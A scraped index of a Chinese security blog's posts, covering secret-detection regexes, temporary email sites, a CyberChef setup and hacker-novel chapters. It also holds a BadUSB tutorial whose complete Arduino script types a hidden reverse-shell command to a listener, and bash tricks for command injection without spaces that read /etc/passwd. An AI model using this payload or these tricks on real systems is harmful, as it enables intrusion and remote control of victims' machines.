&amp;quot;twilio_app_sid&amp;quot;: &amp;quot;AP[a-zA-Z0-9_\\-]{32}&amp;quot;
&amp;quot;paypal_braintree_access_token&amp;quot;: &amp;quot;access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}&amp;quot;
&amp;quot;square_oauth_secret&amp;quot;: &amp;quot;sq0csp-[ 0-9A-Za-z\\-_]{43}&amp;quot;
&amp;quot;square_access_token&amp;quot;: &amp;quot;sqOatp-[0-9A-Za-z\\-_]{22}&amp;quot;
&amp;quot;stripe_standard_api&amp;quot;: &amp;quot;sk_live_[0-9a-zA-Z]{24}&amp;quot;
&amp;quot;stripe_restricted_api&amp;quot;: &amp;quot;rk_live_[0-9a-zA-Z]{24}&amp;quot;
&amp;quot;github_access_token&amp;quot;: &amp;quot;[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*&amp;quot;
&amp;quot;private_ssh_key&amp;quot;: &amp;quot;-----BEGIN PRIVATE KEY-----[a-zA-Z0-9\\S]{100,}-----END PRIVATE KEY——&amp;quot;
&amp;quot;private_rsa_key&amp;quot;: &amp;quot;-----BEGIN RSA PRIVATE KEY-----[a-zA-Z0-9\\S]{100,}-----END RSA PRIVATE KEY-----&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
">一些提取api key的正则表达式</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Temporary-mail-service/"" data-c="
          &lt;p&gt;临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。&lt;/p&gt;
&lt;h2 id=&#34;推荐使用的&#34;&gt;推荐使用的：&lt;/h2&gt;
&lt;p&gt;https://t.odmail.cn&lt;br&gt;
https://www.mohmal.com&lt;br&gt;
http://od.obagg.com&lt;br&gt;
http://onedrive.readmail.net&lt;br&gt;
http://xkx.me&lt;/p&gt;
&lt;h2 id=&#34;其它&#34;&gt;其它&lt;/h2&gt;
&lt;!-- more --&gt;
&lt;p&gt;https://www.guerrillamail.com/&lt;br&gt;
https://10minutemail.com&lt;br&gt;
https://www.trash-mail.com/inbox/&lt;br&gt;
https://www.mailinator.com&lt;br&gt;
http://www.yopmail.com/en&lt;br&gt;
https://generator.email&lt;br&gt;
https://en.getairmail.com&lt;br&gt;
http://www.throwawaymail.com/en&lt;br&gt;
https://maildrop.cc&lt;br&gt;
https://owlymail.com/en&lt;br&gt;
https://www.moakt.com&lt;br&gt;
https://tempail.com&lt;br&gt;
http://www.yopmail.com&lt;br&gt;
https://temp-mail.org/en&lt;br&gt;
https://www.emailondeck.com&lt;br&gt;
https://smailpro.com&lt;br&gt;
https://anonbox.net&lt;br&gt;
https://M.kuku.lu&lt;/p&gt;
">一些临时邮箱服务网站</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Badusb-Attack-On-Mac-OSX/"" data-c="
          &lt;p&gt;Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/embed/VdbTwopR4iY&#34;&gt;点此打开&lt;/a&gt;观看一段演示视频，需fq。&lt;/p&gt;
&lt;h2 id=&#34;利用场景&#34;&gt;利用场景&lt;/h2&gt;
&lt;p&gt;说下本文中利用场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;混入企业内部，员工电脑未锁屏的情况下。在之前去过很多客户那里，大多数企业的员工离开电脑前不锁屏的情况,而且非常严重。&lt;/li&gt;
&lt;li&gt;对于无安全意识的员工进行攻击，如公司文员、前台、行政等，例如将usb贴上保密、照片等字样，并扔到显眼位置，以吸引人来捡并插入其电脑。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;针对Badusb攻击手段还有很多，利用场景也还有，这里仅列出与本文有关的部分。下面就让我们正式开始进入制作。&lt;/p&gt;
&lt;h2 id=&#34;准备工作&#34;&gt;准备工作&lt;/h2&gt;
&lt;h3 id=&#34;硬件&#34;&gt;硬件&lt;/h3&gt;
&lt;!-- more --&gt;
&lt;ul&gt;
&lt;li&gt;Arduino Leonardo 淘宝上直接搜索Badusb，有很多卖的，价格都比较便宜。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;软件&#34;&gt;软件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Arduino IDE  官网下载地址：&lt;a href=&#34;https://www.arduino.cc/en/Main/Software&#34;&gt;https://www.arduino.cc/en/Main/Software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;免杀木马，我这里macos下直接用的反弹shell，windows下使用的是免杀的meterpreter，payload为reverse_tcp。由于免杀不是本文重点，请自行制作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;
&lt;p&gt;Badusb属于HID注入攻击的一种形式。HID是Human Interface Device的缩写，HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。今天使用的Arduino Leonardo板子主要是一款键盘注入工具，除此之外还有WIFI版的（通过链接wifi，然后发起攻击）、伪装为充电线的（USB-C）。目前，前者成本较低，后者成本较高。有国外安全研究人员有在售卖USB Cable。有一些手机也支持用来进行hid注入攻击。比如GOOGLE NEXUS手机，刷入kali nethunter系统即可，在淘宝上可以购买到二手手机，成本只要300左右。&lt;/p&gt;
&lt;p&gt;安装好arduino ide后，插入Arduino Leonardo板子，打开arduino ide，选择【工具】-【开发版】-【Arduino Leonardo】。&lt;/p&gt;
&lt;p&gt;接下来就开始编写攻击代码了。默认显示的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void setup() {
  // put your setup code here, to run once:
}

void loop() {
  // put your main code here, to run repeatedly:
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;setup函数主要是安装时运行的代码，loop函数为重复执行的代码。一般我们都写入到setup函数中。&lt;br&gt;
代码的语法并不多，主要有：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#include &amp;lt;Keyboard.h&amp;gt;&lt;/code&gt;  这里是包含Keyboard.h文件，该文件里定义了一些按键常量。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Keyboard.begin();&lt;/code&gt; 开始键盘通讯&lt;br&gt;
&lt;code&gt;delay(100);&lt;/code&gt; 延迟执行，单位是毫秒&lt;br&gt;
&lt;code&gt;Keyboard.press()&lt;/code&gt;   按下某个按键&lt;br&gt;
&lt;code&gt;Keyboard.release()&lt;/code&gt;  松开某个按键&lt;br&gt;
&lt;code&gt;Keyboard.end();&lt;/code&gt;  结束键盘通讯&lt;/p&gt;
&lt;p&gt;这里需要注意的是，不同的板子语法会有不同和差异。&lt;/p&gt;
&lt;p&gt;ascii对应键值表：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1586161712598.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;（图片来源：https://zhuanlan.zhihu.com/p/28194271）&lt;/p&gt;
&lt;h2 id=&#34;实战攻击&#34;&gt;实战攻击&lt;/h2&gt;
&lt;p&gt;好了，有了如上基础，我们可以来实战攻击了。网上的代码总有一些问题，导致实际的成功率并不高。所以我对其进行了加强。&lt;br&gt;
执行流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;打开 &lt;code&gt;聚焦搜索&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;搜索终端&lt;code&gt;terminal&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打开终端&lt;/li&gt;
&lt;li&gt;执行&lt;code&gt;bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行反弹shell代码&lt;/li&gt;
&lt;li&gt;切换输入法&lt;/li&gt;
&lt;li&gt;再次执行反弹shell代码&lt;/li&gt;
&lt;li&gt;退出终端。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;采用如上的流程，主要考虑到如下了几种情况来，从而提高其代码执行的成功率。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;mac系统是类unix系统，区分大小写。&lt;/li&gt;
&lt;li&gt;不同的mac版本系统，以及使用者设置的习惯不同&lt;/li&gt;
&lt;li&gt;如何让反弹shell代码在后台执行，并隐藏终端窗口。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;具体的实现可看代码&lt;br&gt;
代码地址已经上传到github，地址：&lt;a href=&#34;https://github.com/insightglacier/badusb_script&#34;&gt;https://github.com/insightglacier/badusb_script&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;脚本代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;Keyboard.h&amp;gt;

void setup() {
 Keyboard.begin();//开始键盘通讯
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(30);
  Keyboard.press(32);//按住空格，也就是command + 空格
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(32);
  delay(100);
  Keyboard.println(&amp;quot;terminal&amp;quot;);  //打开终端
  delay(2000); 
  Keyboard.press(KEY_RETURN);
  delay(100); 
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.println(&amp;quot;bash&amp;quot;); //打开bash
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);//
  Keyboard.println(&amp;quot;nohup bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/1337 0&amp;gt;&amp;amp;1 &amp;amp;&amp;quot;);// 利用nohup在后台执行反弹shell代码
  delay(100);
  Keyboard.press(KEY_RETURN);//
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.press(32);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);   //切换输入法。
  delay(100);
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);   //另外一种切输入法操作
  delay(100);
  Keyboard.press(32);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.release(32);
  delay(100);
  Keyboard.println(&amp;quot;nohup bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/1337 0&amp;gt;&amp;amp;1 &amp;amp;&amp;quot;);// 利用nohup在后台执行反弹shell代码
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press(&#39;q&#39;);//按下Q键
  delay(100);
  Keyboard.release(&#39;q&#39;);// 放开Q键
  Keyboard.release(KEY_LEFT_GUI);//Command+Q退出终端
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();//结束键盘通讯
}
void loop() {
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码注释写的很清楚来，也不难。写完代码后，我们可以点击验证（左上角对号）验证代码是否有语法错误。点击上传，ide会自动编译并上传代码到开发板中。成功后会直接执行我们的代码。测试在本机执行后，就可以到其机器上运行了。&lt;/p&gt;
&lt;h2 id=&#34;badusb防御&#34;&gt;Badusb防御&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Google 开源的badusb防御产品ukip，地址：https://github.com/google/ukip 。原理主要是监测按键键入的时间，并且自动判断是否为恶意攻击。&lt;/li&gt;
&lt;li&gt;在测试过程中，windows10 系统会识别一些恶意的usb固件。建议开启windows defender。当然这种也并不保险。&lt;/li&gt;
&lt;li&gt;对来历不明的usb设备，请慎重插入到电脑上（建议不插到电脑上）。&lt;/li&gt;
&lt;li&gt;当然网络上也有设置组策略的方式进行阻止，以及禁用usb口来防御。这里具体看企业自身情况进行设置。具体配置方法自行搜索吧。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;Badusb的优点是杀毒软件无法查杀和拦截，但是其缺点也很明显，就是键盘输入的过程会在界面上有短暂的显示。每种攻击手法并不是万能的，只是一种手段，根据攻击场景不同，选择合适的攻击手段最终达到完美的攻击，这是我们所需要追求的。&lt;/p&gt;
&lt;p&gt;关于Badusb的攻击这仅仅只是一种，还有更多的攻击方法，感兴趣的可以自行搜索学习。还有很多有趣的玩法。对于文中的问题，欢迎与我讨论交流。&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;https://zhuanlan.zhihu.com/p/28194271&lt;/li&gt;
&lt;li&gt;https://baike.baidu.com/item/USB-HID/3074554&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;注：本文仅做为研究，文中所提到的代码及攻击方式，仅用于企业内部安全测试与授权测试中。请勿将其用于非法渗透中，否则造成的一切后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">Badusb 攻击之MacOSX系统实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/build-own-cyberchef/"" data-c="
          &lt;p&gt;CyberChef是一个很好很强大的程序,很实用。&lt;/p&gt;
&lt;p&gt;由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in CyberChef这个浏览器插件就更加方便。&lt;/p&gt;
&lt;p&gt;直接下载官方生成的包，下载地址：&lt;a href=&#34;https://github.com/gchq/CyberChef/releases&#34;&gt;https://github.com/gchq/CyberChef/releases&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我这里直接上传到github，并且启用github pages。然后绑定解析自己的域名即可线上访问。我这里搭建好的无google统计的地址：&lt;a href=&#34;https://cyberchef.bacde.me&#34;&gt;https://cyberchef.bacde.me&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;接下来安装Open in CyberChef 这个chrome插件。插件地址:&lt;a href=&#34;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related&#34;&gt;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这样就可以直接右键发送到自己的cyberchef，方便了很多。使用效果如下：&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585901306155.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585901514463.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585901579171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">搭建自己的CyberChef</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hunting-tips-mindmap/"" data-c="
          &lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585885276203.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;PDF下载地址：&lt;a href=&#34;https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8jawwcpbp3ajpIuOoUievUGrDkbfWs&#34;&gt;https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8jawwcpbp3ajpIuOoUievUGrDkbfWs&lt;/a&gt;&lt;/p&gt;
">Hunting Tips Mindmap</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Twelve/"" data-c="
          &lt;pre&gt;&lt;code&gt;人生比地狱还像地狱。
——芥川龙之介 《罗生门》
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;疫情之下，疾病面前，所有人都是平等的。无论你是谁，都有被感染的风险。等待病人的是死亡，因为病毒正在一点一点的无情摧毁着病人的防御系统。&lt;/p&gt;
&lt;p&gt;王梓很不幸，在到达小镇的几天内，他就开始感受到了全身的不舒服，症状与报道种的症状无例外。他很痛苦，但他的内心还仍然想着那未完成的事，那个真相。&lt;/p&gt;
&lt;p&gt;他已经没有什么力气，他无法在操作电脑，在现实世界，他没有了电脑，没有了电子产品，他变得普通到不能在普通。而多年的熬夜，不规律，是他的身体免疫特别查，尽管不久前开始练习太极拳，但是，这么短的时间他还没有增强太多。&lt;/p&gt;
&lt;p&gt;等待他的是死亡，死神正一点一点的靠近他。他想起了小楠，想起了他们在一起的日子。或许，如果人生让他重来的话，他不在选择生活在黑暗中。一切都已经晚了，人生没有重启键，无法重新来过。结局早已经在当初的选择时就已经注定。&lt;/p&gt;
&lt;p&gt;再见了，世界！&lt;/p&gt;
&lt;p&gt;就这样，王梓带着他所知道的秘密离开了这个世界。世界上其他的人仍然还在继续忙碌着，在寻找他。&lt;/p&gt;
&lt;p&gt;（完）&lt;/p&gt;
&lt;p&gt;草草的完结了不算小说的小说，最近反复读了多遍，自己感觉已经无法写下去了。计划对小说重新进行构思。或许还会有下一步真正意义上的小说。谢谢大家！&lt;/p&gt;
">原创小说《杀手》第十二章 疫情之下（完）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Eleven/"" data-c="
          &lt;pre&gt;&lt;code&gt;真正的牢狱是恐惧
而真正的自由是
免于恐惧的自由
            ——昂山素季
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;北京下雪了&#34;&gt;北京，下雪了&lt;/h2&gt;
&lt;p&gt;近几年北京下雪的场景比较罕见，不过今年似乎是个以外，这已经是北京的第三场雪了。而中国最传统的节日——春节也即将到来。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585023705115.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;王梓坐在不知通往哪里的车，看着窗外的大雪，回忆起了10年前的冬天：同样是下雪天，而他穿着单薄的衣服，刚刚从网吧里出来。而此时的他已经没有钱了。因为经常来这家网吧，他跟网吧的老板比较熟，他曾经跟老板商量，能不能赊账。当时网吧老板直接就给拒绝了，并摆出了一副没有商量的姿态。网吧老板知道王梓的父亲跟母亲离婚，而父亲整日无所事事，只会到处去骗点钱，然后买酒，赌博。10年前的王梓还在上初中，整天不好好学习，沉迷于网络游戏中，但是因为穷，父亲给的钱不多，也没多少时间上网。每次从网吧出来都要走着回家。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;一阵阵的风吹过，王梓又收了收紧自己的衣服。他心想着：“我得找个地方暖暖”。他加快了脚步，同时在看附近有没有可以不要钱又能暖和的地方，而他也很幸运的发现了一家小书店，书店名叫三联书店。他什么都没想就朝着书店走去。推开了门，“叮铃～”，一个清脆的声音从王梓头上发出。屋子里很暖合，面积不大，一共只有四排书架，还有一些书被平放在长长的桌子上，右侧的收银妹子正在忙着，其他还有几个在选书的男男女女，买书的人也不多。而此时王梓已经从寒冷中缓了过来。他开始漫无目的乱看。这家书店卖的大多数都是杂志，很全，什么种类的都有，除了常见的《意林》、《故事会》外，还有科技类，车类，军事类、时尚类。而映入王梓眼帘的有几个大字，上面写着“黑客x档案”，而在杂志的封面，王梓注意到了一个标题“教你如何在网吧免费上网”。王梓的兴趣来了，拿起了书读起来。因为没钱买，他特意看了两遍，把杂志中的步骤记下来了。外面的雪还没有停，王梓便翻了翻其他的文章，看了一会，发现其他的完全看不懂。不过他了解到了网络中有一种身份是黑客，而这本杂志讲述了黑客技术，可以教会别人怎么去入侵别人的网站，怎么获得免费的东西，怎么去盗取别人的账号密码等。他又看了看，还是看不懂，他想，算了，先试试免费上网。&lt;/p&gt;
&lt;p&gt;第二天，他拿着几块钱，来到一家新的网吧，打算尝试新学会的技能，他只押1个小时的钱。开始按照书中的内容操作，因为要等待到时间了才能知道成功不成功。王梓也不想打游戏了，完全被前一天看到的内容所吸引。他想搞明白昨天看的那些到底是什么，他开始在网络中寻找这些相关的资料。时间过的很快，1个小时过去了。他的机器没有被锁住，还可以继续上网。此时的他内心中有一点点害怕，但同时也是兴奋的。他成功了逃过了网吧的计费软件，免费上网了。那个免费上网方法原来很简单，因为网吧计费软件使用了ipx的协议进行通信，而王梓那时候逃过计费软件仅仅只是通过禁用该协议来让网吧的计费控制端不能给他的机器发送锁屏，关机等指令。当时对刚入门的王梓来说，那可是相当的神奇。当然这种方法在现在已经不管用了。后来他去以前经常去的那家网吧，学会了破解了网吧客户端的密码，以管理员身份上网。而在不久后，他又学会了用啊d网络工具包入侵网吧计费电脑来给自己改钱。不过因为初出茅庐，次数多了就被网管发现，被警告，被赶出过网吧。不过，他享受着。或许也是因为这刚开始小小的成功，他对黑客的兴趣也更加浓烈，也是因为此，如今的他成了一名职业黑客。&lt;/p&gt;
&lt;p&gt;车停下了，王梓背起包走下车。这是一个小镇，因为临近春节，大街小巷的路灯都挂满了红彤彤的灯笼，小镇显得格外的热闹。春节是一个家人团聚的节日，而对于王梓来说，他就是家，他在哪里家就在哪里。小镇四处转转，其实他是在熟悉地形。找了视野比较好的地方，在附近租了一间房子，这便是安顿下来了。打开了电脑。点开了留言：“你失信了！东西在哪里？交出来！不然你会很危险！”&lt;/p&gt;
&lt;p&gt;王梓最讨厌的就是背叛和威胁，这个单子，让他陷入如此的境遇。王梓所向往的自由还很远。他不去理会，而是看看最近网络新闻，最近大多数消息都开始围绕一种新型冠状病毒，随着报道越来越多，以及病例数也逐渐增多。一时间全国各地的药店，口罩和消毒水卖到脱销。王梓也赶紧买了一些。接下来的日子王梓要想办法过上正常生活，他再次打开电脑，并给对方回复：“你违背了我的交易原则，不与政府有任何关系。作为惩罚，你们的钱我扣下了”。发完消息后，他收起电脑。该好好休息下了。&lt;/p&gt;
&lt;p&gt;王梓做了一个梦：“一个阳光明媚的午后，王梓在街上走着，小楠出现在了不远处向他走来，阳光从侧上方照射到了小楠身上，小楠的身后就像发着光，一阵风吹过她的秀发，飘起，微微一笑。王梓也不自觉的笑起来。小楠美极了。突然，一阵刹车声，一辆车停下，几个人下车，迅速的跑向小楠，把小楠抓到了车上。而此时的王梓想要去追上去，却追不上去，车子离的越来越远。很快的，王梓听到小楠的哭泣声，救我～救我～，小楠被绑在一个椅子上，眼睛被封住。旁边有人拿了一把刀架在她的脖子上。有一个中年人在视频中对王梓说，看到她了吧，在我们这里，你赶快现身，不然我们做出什么事情。说着刀子又下去了一点，小楠的脖子开始从刀子上流出一点点鲜血。王梓大声喊：不要，不要，你们在哪里，我去，快她放了。”&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585023384199.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;“不要……”王梓从梦中惊醒。满头大汗，此时房间内四周都很安静，什么都没有发生。他去客厅倒了一杯数，深吸了一口气，让自己平静下来。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;h2 id=&#34;黑客兵器谱&#34;&gt;黑客兵器谱&lt;/h2&gt;
&lt;p&gt;啊d网络工具包：一款网络工具包，有很多入侵功能，文中提到的是利用木马种植器功能，配合pcshare控制了网吧的电脑（亲身经历过的）。当然还有其他的功能如端口探测等，目标发现，共享扫描等功能。在以前idc没有过滤139，135这类端口对外网也是有效果的。&lt;/p&gt;
&lt;h2 id=&#34;小知识&#34;&gt;小知识&lt;/h2&gt;
&lt;p&gt;文中所说的免费上网原理其实已经交代明白了，因为都已经失效了，所以不再重复了。而获取网吧客户端的密码直接使用读取的软件就可以读出来了。&lt;/p&gt;
">原创小说《杀手》第十一章 自由</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/bashtricks-execute-commands-without-space/"" data-c="
          &lt;p&gt;在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;IFS=,;`cat&amp;lt;&amp;lt;&amp;lt;cat,/etc/passwd` 
cat$IFS/etc/passwd 
cat${IFS}/etc/passwd 
cat&amp;lt;/etc/passwd 
{cat,/etc/passwd} 
X=$&#39;cat\x20/etc/passwd&#39;&amp;amp;&amp;amp;$X
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&#34;https://twitter.com/omespino/status/1241544334329208838&#34;&gt;https://twitter.com/omespino/status/1241544334329208838&lt;/a&gt;&lt;/p&gt;
&lt;!-- more --&gt;
">bashtricks ：无空格命令执行</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Ten/"" data-c="
          &lt;p&gt;&lt;strong&gt;我不相信造化弄人。世界上出类拔萃的人，都主动找寻他们想要的环境。要是遍寻不获,他们就创造一个。 ——萧伯纳&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;王梓家中&#34;&gt;王梓家中&lt;/h2&gt;
&lt;p&gt;结果往往在一个人做选择的时候就已经注定。危险正在一点一点向王梓靠近。买家提出的线下交易，对于网络杀手走入现实，那么就以为着自杀。羸弱的王梓，能打得过谁呢。除此之外，还很有可能就像阿桑奇被捕时的样子。那一副银白色手镯想想都觉得冰冷。王梓不禁打了一个冷颤。&lt;/p&gt;
&lt;p&gt;当下，王梓没有太多的时间想这些，他必须要走下去。就算没有出路，那么也要走出一条自己的路。&lt;/p&gt;
&lt;p&gt;普通的夜晚，大多数人已进入梦乡。王梓在电脑前敲击着键盘，眼镜上可以看到映射出的一行行代码，电脑的usb口上连接着一台树莓派上。此时编写的程序就是即将在这台微型电脑上运行的。流动的代码仿佛在与时间赛跑，慢一步就可能被超过而崩溃。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584374892509.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;不知不觉，清晨的朝阳照亮了阳台，温暖而不炙热。随着最后一次回车键按响，程序也可以正常运行起来。就要离开这里了，收起桌上的两台笔记本电脑、U盘、望远镜、还有插在电脑上的树莓派装到背包里。将手机放到了微波炉里，并放在了电脑旁。王梓走出房子，电脑正常运行着。&lt;/p&gt;
&lt;p&gt;站在天台上，阳光照射全身，一股暖意袭遍王梓的全身。好难得的时光。可惜，马上就要走了。王梓找了快隐蔽的可以放进树莓派的地方，把树莓派放好，然后把太阳能天池板放到外面。可以为树莓派续航。&lt;/p&gt;
&lt;p&gt;王梓拿起了一部新手机，拨通了小楠的电话。响了三声，电话接通了。传来了带有起床气的一声喂，哪位？。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;“早上好啊～，我王梓。”。&lt;br&gt;
“这么早，你干什么呀？”&lt;br&gt;
“我就要离开这里了，一会的飞机，打电话跟你道个别。”&lt;br&gt;
“道别？你要去哪里啊？怎么也不提前打个招呼，怎么也要当面道别啊。”&lt;br&gt;
“我…… 我怕没有当面没有道别的勇气”&lt;br&gt;
“你呀，怎么说你好呢。那你要群里，以后有机会了，去找你玩啊。”&lt;br&gt;
“好，等我到了地方，发地址给你。你要记得按时吃早餐，注意身体。”&lt;br&gt;
“好～～”&lt;br&gt;
“记得，你欠我一顿饭了哦～千万不要忘记了哦”&lt;br&gt;
“嘿嘿～，忘不了。你接着睡吧。”&lt;br&gt;
“拜拜”&lt;br&gt;
“再见”&lt;/p&gt;
&lt;p&gt;小楠那边挂了电话，王梓说了一句：“后会无期”。脑海里浮现了那几句歌词：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;当一艘船沉入海底，当一个人成了谜
你不知道，他们为何离去
那声再见竟是他最后一句
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;旅游大把候车点&#34;&gt;旅游大把候车点&lt;/h2&gt;
&lt;p&gt;北京的早高峰即将到来，此刻，十几个人正在排队登上去往八达岭的旅游客车。王梓就在其中。王梓上车后，使用国外的网络电话给买家发了一条消息，两个小时后，八达岭长城景区景点见。一晚没睡，显得有些疲惫，可以趁车上的时间睡一会儿。&lt;/p&gt;
&lt;p&gt;到达地点后，王梓观察了下周围的环境。并寻找到了一处地点发给了对方，他则找了远处的一个地方，手持望远镜，等待这目标出现。约定的时间马上就要到了，有一个身穿牛仔裤，黑色夹克衫的中年男子出现了王梓视线内。王梓拨通了电话，那名男子拿起电话。确认了就是这个人。&lt;br&gt;
电话那头说：“我已经到了，你在哪里。”&lt;br&gt;
“进入景区，你找一个穿红色里面穿红色卫衣，头戴红色帽子，手拿红色导游旗子的就是我了。”&lt;br&gt;
“好，等我。”&lt;/p&gt;
&lt;p&gt;王梓观察这那名男子一举一动，王梓观察到周围有几个人也一直在跟着那个人。不久，他找到了王梓说的人，然后不知怎么起了一些争执，就要动手。此人看上去练过的样子。王梓觉得事情不好。关掉手机，往停车场走去。那个人自然联系不到王梓，他们只好给王梓留言。而王梓也开始了自己的逃亡之路。&lt;/p&gt;
